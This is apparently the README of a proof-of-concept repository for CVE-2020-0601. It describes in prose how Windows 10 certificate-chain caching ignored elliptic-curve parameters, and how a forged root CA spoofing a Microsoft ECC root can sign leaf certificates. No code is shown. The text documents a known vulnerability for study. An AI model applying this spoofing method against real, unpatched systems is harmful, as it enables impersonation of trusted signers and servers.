# CVE-2020-0601 proof of concept

A fun proof of concept to create your own root CA and signed certificate based
on the CVE-2020-0601 vulnerability in Windows 10. The basis for the issue is
the `CertGetCertificateChain()` method improperly validated root certificate
authorities. Since the search for a signing certificate within the trust store
can be expensive, Microsoft implemented a cache which used the public key of
the provided root certificate to determine if this certificate had previously
been loaded from the trust store. However, for elliptic curve certificates, the
SubjectPublicKeyInfo contains more than just a public key. Elliptic curve
certificates must reference the specific elliptic curve (or provide their own
custom elliptic curve parameters). The vulnerability occurs because the
elliptic curve parameters are not included in the cache lookup. We can take an
existing public key, choose a new private key, compute curve parameters which
make this combination valid, and create a root certificate that will pass
Microsoft's previously vulnerable cache lookup.

This repository demonstrates spoofing the "Microsoft EV ECC Root Certificate
Authority 2017" trusted root certificate and using this new root CA to sign a
leaf certificate.
